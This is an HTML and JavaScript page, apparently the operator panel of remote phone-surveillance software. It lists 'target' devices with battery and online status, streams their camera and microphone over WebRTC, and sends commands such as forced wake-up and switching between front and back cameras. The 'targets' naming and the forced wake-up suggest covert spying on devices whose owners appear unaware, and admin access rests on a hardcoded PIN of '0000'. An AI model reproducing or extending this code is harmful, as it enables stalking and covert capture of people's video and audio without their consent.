<!DOCTYPE html>
<html>
<head>
    <title>LEO HUB PRO - SMOOTH VIEW</title>
    <script src="/socket.io/socket.io.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        :root { --blue: #00d4ff; --dark: #050a14; --panel: #0a192f; --neon: #00ff9d; }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background: var(--dark); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; height: 100vh; flex-direction: row; }
        
        /* Sidebar Responsive */
        .sidebar { width: 280px; background: var(--panel); padding: 15px; border-right: 1px solid #1e3a8a; overflow-y: auto; flex-shrink: 0; }
        .user-item { background: #112240; padding: 12px; margin: 8px 0; border-radius: 10px; cursor: pointer; border: 1px solid transparent; position: relative; transition: 0.2s; }
        .user-item.active { border-color: var(--blue); background: #162a4d; box-shadow: 0 0 10px rgba(0,212,255,0.2); }
        .user-item.online { border-left: 4px solid var(--neon); }
        .user-item.offline { border-left: 4px solid #ff4444; opacity: 0.6; }

        /* Main Viewport */
        .main { flex: 1; display: flex; flex-direction: column; height: 100vh; position: relative; background: #000; }
        .top-bar { padding: 10px 20px; background: var(--panel); display: flex; justify-content: space-between; align-items: center; font-size: 0.8rem; border-bottom: 1px solid #1e3a8a; }
        
        /* Video Container - AUTO ADJUST */
        .video-box { flex: 1; display: flex; align-items: center; justify-content: center; overflow: hidden; position: relative; background: #000; }
        video { width: 100%; height: 100%; object-fit: contain; /* Isse poora view dikhega bina kute */ }
        
        /* Floating Controls */
        .controls-overlay { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 500px; display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; z-index: 10; }
        .btn { background: rgba(16, 34, 64, 0.9); border: 1px solid var(--blue); color: var(--blue); padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 0.75rem; backdrop-filter: blur(5px); }
        .btn-wake { background: var(--neon); color: #000; border: none; grid-column: span 2; font-size: 0.9rem; }
        
        #audio-indicator { position: absolute; top: 20px; right: 20px; background: rgba(255,0,0,0.7); padding: 8px 15px; border-radius: 20px; font-size: 0.7rem; cursor: pointer; z-index: 11; }
        
        @media (max-width: 768px) {
            body { flex-direction: column; }
            .sidebar { width: 100%; height: 180px; border-right: none; border-bottom: 1px solid #1e3a8a; }
        }
    </style>
</head>
<body>
    <div class="sidebar">
        <h3 style="color: var(--blue); font-size: 1rem; margin-top: 0;">DEVICES</h3>
        <div id="user-list"></div>
    </div>

    <div class="main">
        <div class="top-bar">
            <div>HUB: <span style="color:var(--neon);">SECURE</span></div>
            <div>DEVICE: <span id="cur-id" style="color:var(--blue);">NONE</span></div>
        </div>

        <div class="video-box">
            <video id="remoteVideo" autoplay playsinline></video>
            <div id="audio-indicator" onclick="unmute()">ðŸ”Š CLICK TO UNMUTE</div>
        </div>

        <div class="controls-overlay">
            <button class="btn btn-wake" onclick="sendCommand('wake-up')">âš¡ FORCE WAKE-UP DEVICE</button>
            <button class="btn" onclick="sendCommand('front')">FRONT CAM</button>
            <button class="btn" onclick="sendCommand('back')">BACK CAM</button>
            <button class="btn" onclick="refreshStream()">REFRESH</button>
            <button class="btn" style="color:#ff4444; border-color:#ff4444;" onclick="location.reload()">RESET</button>
        </div>
    </div>

    <script>
        const socket = io();
        let currentTarget = null, pc, history = {};
        const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };

        socket.emit('admin-join', "0000");
        socket.on('admin-status', (r) => { if(!r.success) alert("WRONG PIN"); });

        socket.on('update-targets', (list) => {
            for (let id in history) history[id].status = 'offline';
            list.forEach(t => {
                history[t.id] = { id: t.id, battery: t.battery, device: t.device, status: 'online' };
            });
            renderList();
        });

        function renderList() {
            const div = document.getElementById('user-list');
            div.innerHTML = "";
            Object.keys(history).forEach(id => {
                const dev = history[id];
                const item = document.createElement('div');
                item.className = `user-item ${currentTarget === id ? 'active' : ''} ${dev.status}`;
                item.innerHTML = `<strong>Device_${id.substring(0,4)}</strong><br>
                                  <div style="font-size:0.65rem; color:#8892b0;">Bat: ${dev.battery} | ${dev.status.toUpperCase()}</div>`;
                item.onclick = () => { currentTarget = id; document.getElementById('cur-id').innerText = id.substring(0,6); renderList(); if(dev.status === 'online') select(id); };
                div.appendChild(item);
            });
        }

        async function select(id) {
            if(pc) pc.close();
            pc = new RTCPeerConnection(config);
            pc.onicecandidate = (e) => { if(e.candidate) socket.emit('signal', { to: id, signal: { candidate: e.candidate } }); };
            pc.ontrack = (e) => { document.getElementById('remoteVideo').srcObject = e.streams[0]; };
            socket.emit('command', { targetId: id, cmd: 'start' });
        }

        function unmute() { const v = document.getElementById('remoteVideo'); v.muted = false; v.play(); document.getElementById('audio-indicator').style.display='none'; }
        function refreshStream() { if(currentTarget) select(currentTarget); }
        function sendCommand(c) { if(!currentTarget) return alert("Select device!"); socket.emit('command', { targetId: currentTarget, cmd: c }); }

        socket.on('signal', async (d) => {
            if(d.from !== currentTarget) return;
            if(d.signal.sdp) {
                await pc.setRemoteDescription(new RTCSessionDescription(d.signal.sdp));
                if(d.signal.sdp.type === 'offer') {
                    const ans = await pc.createAnswer();
                    await pc.setLocalDescription(ans);
                    socket.emit('signal', { to: d.from, signal: { sdp: ans } });
                }
                } else if(d.signal.candidate) pc.addIceCandidate(new RTCIceCandidate(d.signal.candidate));
        });
    </script>
</body>
</html>
